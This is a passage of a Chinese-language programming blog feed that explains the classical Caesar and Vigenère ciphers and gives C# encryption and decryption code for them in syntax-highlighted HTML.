<span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> Vigenere加密</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Vigenere加密</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">string</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//k:密钥计数器</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> plaintext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> min_mod <span class="token operator">=</span> str<span class="token punctuation">.</span>Length <span class="token operator">></span> key<span class="token punctuation">.</span>Length <span class="token operator">?</span> key<span class="token punctuation">.</span>Length <span class="token punctuation">:</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>            StringBuilder strBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    x <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    y <span class="token operator">=</span> key<span class="token punctuation">[</span>k<span class="token operator">++</span> <span class="token operator">%</span> min_mod<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>codeMatrix<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> strBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> Vigenere解密</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Vigenere解密</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">Decrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">string</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//k:密钥计数器</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> min_mod <span class="token operator">=</span> str<span class="token punctuation">.</span>Length <span class="token operator">></span> key<span class="token punctuation">.</span>Length <span class="token operator">?</span> key<span class="token punctuation">.</span>Length <span class="token punctuation">:</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>            StringBuilder strBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    y <span class="token operator">=</span> key<span class="token punctuation">[</span>k<span class="token operator">++</span> <span class="token operator">%</span> min_mod<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    temp <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> y<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//是否发生回环</span>                    <span class="token punctuation">{</span>                        x <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">-</span> y<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        x <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> y<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> strBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注：</p><ul><li>先构造一张密码表，并显示加(解)密时使用的表</li><li>加密时<strong>查表</strong>，解密时也<strong>查表</strong></li></ul><p><strong>Program测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> Cryptology_Vigenere<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"Vigenere"</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> op<span class="token punctuation">;</span>            <span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ciphytext<span class="token punctuation">,</span>str<span class="token punctuation">;</span>            Vigenere vig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vigenere</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入您想要进行的操作：(1:加密,0:解密) ->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            str <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">out</span> op<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入明文："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    plaintext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密钥："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ciphytext <span class="token operator">=</span> vig<span class="token punctuation">.</span><span class="token function">Encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>ciphytext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密文"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ciphytext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密钥："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    plaintext <span class="token operator">=</span> vig<span class="token punctuation">.</span><span class="token function">Decrypt</span><span class="token punctuation">(</span>ciphytext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序停止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序停止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="结果显示"><a href="#结果显示" class="headerlink" title="结果显示"></a>结果显示</h1><p><strong>加密结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/EnCrypt.png" alt="EnCrypt"></center><p><strong>解密结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/DeCrypt.png" alt="DeCrypt"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="http://www.baike.com/wiki/维吉尼亚密码" target="_blank" rel="noopener">维吉尼亚密码</a></p><p>[简单的加密算法——维吉尼亚密码](</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 古典密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 古典密码 </tag>
            
            <tag> Vigenere </tag>
            
            <tag> 维吉尼亚密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CeasarCipher</title>
      <link href="/2020/08/22/ceasarcipher/"/>
      <url>/2020/08/22/ceasarcipher/</url>
      
        <content type="html"><![CDATA[<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>​        根据罗马早期纪传体作者<strong>盖乌斯·苏维托尼乌斯</strong>的记载，<strong>凯撒大帝</strong>曾用一种移位的方式对军事信息进行加密，后人称这种加密方式为凯撒加密。<strong>凯撒密码</strong>是一种<strong>替换加密</strong>的方案，<strong>明文</strong>中所有字母都在<strong>字母表</strong>上向后(或向前)按照一个固定数目进行偏移后被替换成<strong>密文</strong>。</p><h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>​        <strong>凯撒加密</strong>：</p><p>​        将<strong>26个字母</strong>按顺序进行排列并形成环，将每一位英文字母用其前面(或后面)的第k位字母来表示，替换之后形成新的字符串即为密文。</p><p>​        <strong>举个栗子</strong>：</p><p>​        当明文为：T，偏移量为：3时，使用CeasarCipher如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/CeasarCipher.png" alt="CeasarCipher"></center><p>​        以单表替换的角度来解释即为：</p><p>​        明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ</p><p>​        密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC</p><p>​        明文字母表与密文字母表存在上下的一一对应。当明文为T时，对应密文字母表中的W；解密时也按照一一对应的关系找到每个密文对应的明文即可。</p><p>​        <strong>数学语言描述</strong>：</p><ol><li>首先将字母用数字代替，即：A=0，B=1，C=2，…，Z=25。</li><li>明文空间记为：M</li><li>密文空间记为：C</li><li>密钥空间记为：K<del>m</del></li><li>将偏移量记为：k</li><li>加密操作记为：E<del>(m)</del></li><li>解密操作记为：D<del>(c)</del></li></ol><p>则有：</p><p><strong>加密变换</strong>：<br>$$<br>E_(m_) = (m + k) \ mod \ 26 \ \   ,(m∈M，k∈K)<br>$$<br><strong>解密变换</strong>：<br>$$<br>D_(c_) = (c - k) \ mod \ 26  ,\ \ \  (c∈C，k∈K)<br>$$<br><font color="red">其中：明文空间M、密文空间C、密钥空间K<del>m</del>相同都为模26的余数集合</font></p><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>程序流程图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/CeasarCipherFlowchart.png" alt="CeasarCipherFlowchart"></center><p>注：</p><ul><li><p>第一次输入一个int型数据op，若<code>op==1</code>则执行加密操作，若<code>op==0</code>则执行解密操作，否则结束程序。</p></li><li><p>第二次输入一个字符串，进行加密或解密操作。</p></li><li><p>操作结果后显示加密或解密的结果。</p></li></ul><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><p><strong>Ceasar类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> DemoCeasar<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Ceasar</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加密操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Ceasar加密操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥(1-25)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">int</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str<span class="token punctuation">;</span>            str <span class="token operator">=</span> plaintext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    ciphertext <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    ciphertext <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> ciphertext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Avocat加密（密钥为10）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">AvocatEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// ROT13加密（密钥为13）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">ROT13EnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassis加密（密钥为-5）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassisEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassette加密（密钥为-6）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassetteEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 解密操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Ceasar解密操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥(1-25)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">int</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> plaintext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str<span class="token punctuation">;</span>            str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    plaintext <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    plaintext <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> plaintext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Avocat解密（密钥为10）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">AvocatDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// ROT13解密（密钥为13）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">ROT13DeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassis解密（密钥为-5）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassisDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassette解密（密钥为-6）</span>        <span class="token comment" 